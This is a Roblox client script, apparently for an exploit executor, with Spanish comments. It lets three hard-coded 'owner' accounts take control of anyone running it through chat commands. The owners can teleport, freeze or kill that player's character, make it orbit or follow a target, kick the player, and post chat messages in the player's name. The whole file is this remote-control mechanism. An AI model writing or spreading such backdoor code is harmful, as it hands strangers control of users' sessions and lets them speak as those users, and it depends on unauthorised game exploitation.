task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")
    local TextChatService = game:GetService("TextChatService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StarterGui = game:GetService("StarterGui")
    local LocalPlayer = Players.LocalPlayer
    local ownerIds = {4591285210, 2275056290, 3758584471}

    local Orbiting, Walking, Frozen, EmoteSync = false, false, false, false
    local danceTracks, frozenPositions, emotes = {}, {}, {}
    local emoteSyncTracks = {}
    local lastCommandTime = 0
    local commandCooldown = 0.5
    local emoteSyncConnection = nil
    local targetForEmoteSync = nil

    pcall(function()
        local data = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/AFEM/refs/heads/main/emotes.json")
        emotes = HttpService:JSONDecode(data)
    end)

    local function IsOwner(userId)
        for _, id in ipairs(ownerIds) do
            if userId == id then return true end
        end
        return false
    end

    local function GetOwnerPlayer()
        for _, id in ipairs(ownerIds) do
            local player = Players:GetPlayerByUserId(id)
            if player then return player end
        end
        return nil
    end

    local function GetTargetPlayer(name)
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():sub(1, #name) == name then
                    return p
                end
            end
        end
        return GetOwnerPlayer()
    end

    local function GetTargetPlayers(name)
        local targets = {}
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) and p.Name:lower():sub(1, #name) == name then
                    table.insert(targets, p)
                end
            end
        else
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) then
                    table.insert(targets, p)
                end
            end
        end
        return targets
    end

    local function StartAntiSeatLoop()
        task.spawn(function()
            while Orbiting or Walking do
                task.wait(0.2)
                local char = LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildWhichIsA("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hum and hum.Sit then hum.Sit = false end
                    if hrp and hrp:FindFirstChild("SeatPart") then hrp.SeatPart:Sit(nil) end
                end
            end
        end)
    end

    local function TeleportToPlayer(name)
        local target = GetTargetPlayer(name)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local pos = target.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 6, 0))
            end
        end
    end

    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundTarget")
    end

    local function StartOrbit(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopOrbit()
        Orbiting = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Orbiting = false return end

        RunService:BindToRenderStep("OrbitAroundTarget", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local t = tick()
                local radius = 10
                local speed = 2
                local x = math.cos(t * speed) * radius
                local z = math.sin(t * speed) * radius
                local targetPos = target.Character.HumanoidRootPart.Position
                local newPos = targetPos + Vector3.new(x, 3, z)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, targetPos)
            end
        end)
    end

    local function StopWalking()
        Walking = false
        RunService:UnbindFromRenderStep("WalkToTarget")
    end

    local function WalkToPlayer(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopWalking()
        Walking = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Walking = false return end

        RunService:BindToRenderStep("WalkToTarget", Enum.RenderPriority.Character.Value, function()
            if not Walking then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                humanoid:MoveTo(target.Character.HumanoidRootPart.Position)
            end
        end)
    end

    local function FreezeAll()
        if IsOwner(LocalPlayer.UserId) then return end
        Frozen = true
        RunService:BindToRenderStep("FreezePlayers", Enum.RenderPriority.Camera.Value, function()
            if not Frozen then return end
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = true
            end
        end)
    end

    local function UnfreezeAll()
        if IsOwner(LocalPlayer.UserId) then return end
        Frozen = false
        RunService:UnbindFromRenderStep("FreezePlayers")
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = false
        end
    end

    local function DoRandomDance(player)
        if not player.Character then return end
        local hum = player.Character:FindFirstChildOfClass("Humanoid")
        if not hum or #emotes == 0 then return end

        local random = emotes[math.random(1, #emotes)]
        local rawId = tostring(random.animationid or "")
        local extractedId = rawId:match("id=(%d+)")

        if not extractedId then
            return
        end

        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://" .. extractedId
        local track = hum:LoadAnimation(anim)
        track.Looped = true
        track:Play()

        danceTracks[player] = danceTracks[player] or {}
        table.insert(danceTracks[player], track)
    end

    local function StopAllDancesOn(player)
        if danceTracks[player] then
            for _, track in ipairs(danceTracks[player]) do
                pcall(function() track:Stop() end)
            end
            danceTracks[player] = nil
        end
    end

    local function StopEmoteSync()
        EmoteSync = false
        targetForEmoteSync = nil
        
        -- Detener y limpiar todas las animaciones sincronizadas activas
        for _, track in pairs(emoteSyncTracks) do
            pcall(function()
                if track and track.IsPlaying then
                    track:Stop()
                end
            end)
        end
        emoteSyncTracks = {}
        
        if emoteSyncConnection then
            emoteSyncConnection:Disconnect()
            emoteSyncConnection = nil
        end
        RunService:UnbindFromRenderStep("EmoteSyncDetector")
    end

    local function StartEmoteSync(name)
        if IsOwner(LocalPlayer.UserId) then return end
        
        StopEmoteSync()
        EmoteSync = true
        targetForEmoteSync = GetOwnerPlayer()
        
        if not targetForEmoteSync then 
            EmoteSync = false 
            return 
        end
        
        -- Verificar si debe aplicarse solo a jugador específico
        if name then
            local playerName = LocalPlayer.Name:lower()
            if not (playerName:sub(1, #name) == name:lower()) then
                EmoteSync = false
                return
            end
        end
        
        local lastAnimationId = ""
        local lastAnimationSpeed = 1
        local basicAnimationIds = {}
        local isCapturingBasicAnims = true
        local currentSyncedTrack = nil -- Track actual que estamos sincronizando
        
        -- Capturar animaciones básicas del owner durante los primeros 5 segundos
        task.spawn(function()
            local captureStartTime = tick()
            while isCapturingBasicAnims and (tick() - captureStartTime) < 5 do
                task.wait(0.5)
                if targetForEmoteSync and targetForEmoteSync.Character then
                    local targetHumanoid = targetForEmoteSync.Character:FindFirstChildOfClass("Humanoid")
                    if targetHumanoid then
                        local animator = targetHumanoid:FindFirstChildOfClass("Animator")
                        if animator then
                            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                                if track.Animation and track.Animation.AnimationId then
                                    local animId = track.Animation.AnimationId
                                    -- Marcar animaciones con prioridad Core, Idle o Movement como básicas
                                    if track.Priority == Enum.AnimationPriority.Core or 
                                       track.Priority == Enum.AnimationPriority.Idle or
                                       track.Priority == Enum.AnimationPriority.Movement then
                                        basicAnimationIds[animId] = true
                                    end
                                end
                            end
                        end
                    end
                end
            end
            isCapturingBasicAnims = false
        end)
        
        local lastCheckTime = 0
        local checkCooldown = 0.3 -- Cooldown para evitar detecciones múltiples
        local speedCheckInterval = 0.1 -- Intervalo para verificar cambios de velocidad
        local lastSpeedCheck = 0
        
        RunService:BindToRenderStep("EmoteSyncDetector", Enum.RenderPriority.Character.Value, function()
            if not EmoteSync or not targetForEmoteSync or not targetForEmoteSync.Character then 
                return 
            end
            
            local currentTime = tick()
            if currentTime - lastCheckTime < checkCooldown then
                return
            end
            
            local targetHumanoid = targetForEmoteSync.Character:FindFirstChildOfClass("Humanoid")
            local myCharacter = LocalPlayer.Character
            local myHumanoid = myCharacter and myCharacter:FindFirstChildOfClass("Humanoid")
            
            if not targetHumanoid or not myHumanoid then return end
            
            local targetAnimator = targetHumanoid:FindFirstChildOfClass("Animator")
            if not targetAnimator then return end
            
            -- Buscar la animación de mayor prioridad que NO sea básica
            local highestPriorityTrack = nil
            local highestPriorityValue = -1
            
            for _, track in pairs(targetAnimator:GetPlayingAnimationTracks()) do
                if track.Animation and track.Animation.AnimationId then
                    local animId = track.Animation.AnimationId
                    local priorityValue = track.Priority.Value
                    
                    -- Ignorar animaciones básicas
                    if not basicAnimationIds[animId] then
                        -- Buscar la de mayor prioridad
                        if priorityValue > highestPriorityValue then
                            highestPriorityValue = priorityValue
                            highestPriorityTrack = track
                        end
                    end
                end
            end
            
            -- Si encontramos una animación válida y es diferente a la última
            if highestPriorityTrack and highestPriorityTrack.Animation.AnimationId ~= lastAnimationId then
                lastCheckTime = currentTime
                lastAnimationId = highestPriorityTrack.Animation.AnimationId
                lastAnimationSpeed = highestPriorityTrack.Speed
                
                -- DETENER TODAS LAS ANIMACIONES NO-BÁSICAS DEL SEGUIDOR
                local myAnimator = myHumanoid:FindFirstChildOfClass("Animator")
                if myAnimator then
                    -- Primero, detener tracks guardados
                    for i = #emoteSyncTracks, 1, -1 do
                        local oldTrack = emoteSyncTracks[i]
                        pcall(function()
                            if oldTrack and oldTrack.IsPlaying then
                                oldTrack:Stop()
                            end
                        end)
                        table.remove(emoteSyncTracks, i)
                    end
                    
                    -- Luego, detener cualquier animación que no sea básica
                    for _, myTrack in pairs(myAnimator:GetPlayingAnimationTracks()) do
                        if myTrack.Animation and myTrack.Animation.AnimationId then
                            local myAnimId = myTrack.Animation.AnimationId
                            -- Si no es una animación básica MÍA, detenerla
                            if myTrack.Priority.Value > Enum.AnimationPriority.Movement.Value then
                                pcall(function()
                                    myTrack:Stop()
                                end)
                            end
                        end
                    end
                end
                
                -- Esperar un frame para asegurar limpieza
                task.wait()
                
                -- Cargar y reproducir la nueva animación
                pcall(function()
                    local newAnim = Instance.new("Animation")
                    newAnim.AnimationId = highestPriorityTrack.Animation.AnimationId
                    local newTrack = myHumanoid:LoadAnimation(newAnim)
                    
                    -- Copiar propiedades
                    newTrack.Priority = highestPriorityTrack.Priority
                    newTrack.Looped = highestPriorityTrack.Looped
                    
                    -- Reproducir
                    newTrack:Play()
                    
                    -- SINCRONIZAR VELOCIDAD DE ANIMACIÓN
                    newTrack:AdjustSpeed(highestPriorityTrack.Speed)
                    
                    -- Sincronizar tiempo si es relevante
                    if highestPriorityTrack.TimePosition > 0 and highestPriorityTrack.TimePosition < 0.5 then
                        newTrack.TimePosition = highestPriorityTrack.TimePosition
                    end
                    
                    -- Guardar referencia del track actual
                    currentSyncedTrack = newTrack
                    table.insert(emoteSyncTracks, newTrack)
                    
                    -- Limpiar cuando termine (si no es looped)
                    if not newTrack.Looped then
                        newTrack.Ended:Connect(function()
                            for i, t in ipairs(emoteSyncTracks) do
                                if t == newTrack then
                                    table.remove(emoteSyncTracks, i)
                                    if currentSyncedTrack == newTrack then
                                        currentSyncedTrack = nil
                                    end
                                    break
                                end
                            end
                        end)
                    end
                end)
            -- Verificar cambios de velocidad en la animación actual
            elseif highestPriorityTrack and currentTime - lastSpeedCheck > speedCheckInterval then
                lastSpeedCheck = currentTime
                
                -- Si la velocidad del owner cambió, actualizar la del seguidor
                if currentSyncedTrack and currentSyncedTrack.IsPlaying then
                    local currentSpeed = highestPriorityTrack.Speed
                    if math.abs(currentSpeed - lastAnimationSpeed) > 0.01 then -- Tolerancia de 0.01
                        lastAnimationSpeed = currentSpeed
                        pcall(function()
                            currentSyncedTrack:AdjustSpeed(currentSpeed)
                        end)
                    end
                end
            end
        end)
    end

    -- SISTEMA DE CHAT MEJORADO
    local function SendChatMessage(message)
        pcall(function()
            local textChannel = TextChatService:FindFirstChild("TextChannels")
            if textChannel then
                local generalChannel = textChannel:FindFirstChild("RBXGeneral")
                if generalChannel then
                    generalChannel:SendAsync(message, LocalPlayer)
                    return
                end
            end
        end)

        pcall(function()
            if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
                local chatEvents = ReplicatedStorage.DefaultChatSystemChatEvents
                if chatEvents:FindFirstChild("SayMessageRequest") then
                    chatEvents.SayMessageRequest:FireServer(message, "All")
                    return
                end
            end
        end)

        pcall(function()
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = message,
                Color = Color3.fromRGB(255, 255, 0),
                Font = Enum.Font.GothamBold,
                FontSize = Enum.FontSize.Size18
            })
        end)
    end

    local function SetupCommandDetection()
        local commandHandlers = {}
        
        local function setupChattedHandler(player)
            if IsOwner(player.UserId) then
                local connection
                connection = player.Chatted:Connect(function(message)
                    local currentTime = tick()
                    if currentTime - lastCommandTime < commandCooldown then return end
                    lastCommandTime = currentTime
                    
                    ProcessOwnerCommand(message)
                end)
                commandHandlers[player] = connection
            end
        end

        local function setupTextChatHandler()
            pcall(function()
                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    local textChannels = TextChatService:WaitForChild("TextChannels", 2)
                    if textChannels then
                        for _, channel in ipairs(textChannels:GetChildren()) do
                            if channel:IsA("TextChannel") then
                                channel.MessageReceived:Connect(function(textChatMessage)
                                    local player = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                                    if player and IsOwner(player.UserId) then
                                        local currentTime = tick()
                                        if currentTime - lastCommandTime < commandCooldown then return end
                                        lastCommandTime = currentTime
                                        
                                        ProcessOwnerCommand(textChatMessage.Text)
                                    end
                                end)
                            end
                        end
                    end
                end
            end)
        end

        for _, player in ipairs(Players:GetPlayers()) do
            setupChattedHandler(player)
        end
        
        setupTextChatHandler()

        Players.PlayerAdded:Connect(setupChattedHandler)
        Players.PlayerRemoving:Connect(function(player)
            if commandHandlers[player] then
                commandHandlers[player]:Disconnect()
                commandHandlers[player] = nil
            end
        end)
    end

    function ProcessOwnerCommand(message)
        if message:sub(1,3) == "/e " then message = message:sub(4) end

        local args = {}
        for word in message:lower():gmatch("%S+") do table.insert(args, word) end
        local cmd = args[1]
        local arg = args[2]

        if cmd == ".t" then TeleportToPlayer(arg)
        elseif cmd == ".u" then StartOrbit(arg)
        elseif cmd == ".uu" then StopOrbit()
        elseif cmd == ".w" then WalkToPlayer(arg)
        elseif cmd == ".ww" then StopWalking()

        elseif cmd == ".q" then
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        FreezeAll()
                    end
                else
                    FreezeAll()
                end
            end

        elseif cmd == ".qq" then
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        UnfreezeAll()
                    end
                else
                    UnfreezeAll()
                end
            end
        
        elseif cmd == ".b" then
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        DoRandomDance(LocalPlayer)
                    end
                else
                    DoRandomDance(LocalPlayer)
                end
            end

        elseif cmd == ".bb" then
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        StopAllDancesOn(LocalPlayer)
                    end
                else
                    StopAllDancesOn(LocalPlayer)
                end
            end

        elseif cmd == ".p" then
            if not IsOwner(LocalPlayer.UserId) then
                StartEmoteSync(arg)
            end

        elseif cmd == ".pp" then
            if not IsOwner(LocalPlayer.UserId) then
                StopEmoteSync()
            end

        elseif cmd == ".r" then 
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        if LocalPlayer.Character then
                            LocalPlayer.Character:BreakJoints()
                        end
                    end
                else
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints()
                    end
                end
            end

        elseif cmd == ".s" then 
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        local char = LocalPlayer.Character
                        if char then
                            local hum = char:FindFirstChildOfClass("Humanoid")
                            if hum then
                                hum.Sit = true
                            end
                        end
                    end
                else
                    local char = LocalPlayer.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum.Sit = true
                        end
                    end
                end
            end

        elseif cmd == ".k" then 
            if not IsOwner(LocalPlayer.UserId) then
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        LocalPlayer:Kick("Expulsado por el owner")
                    end
                else
                    LocalPlayer:Kick("Expulsado por el owner")
                end
            end
            
        elseif cmd == ".m" then 
            if not IsOwner(LocalPlayer.UserId) and #args >= 2 then 
                local messageToSend = table.concat(args, " ", 2)
                SendChatMessage(messageToSend)
            end
        end
    end

    local function CheckAndConnectPlayers()
        if not LocalPlayer:FindFirstChild("__JmodsConnected") then
            local marker = Instance.new("BoolValue")
            marker.Name = "__JmodsConnected"
            marker.Parent = LocalPlayer
        end
    end

    CheckAndConnectPlayers()
    SetupCommandDetection()
end)
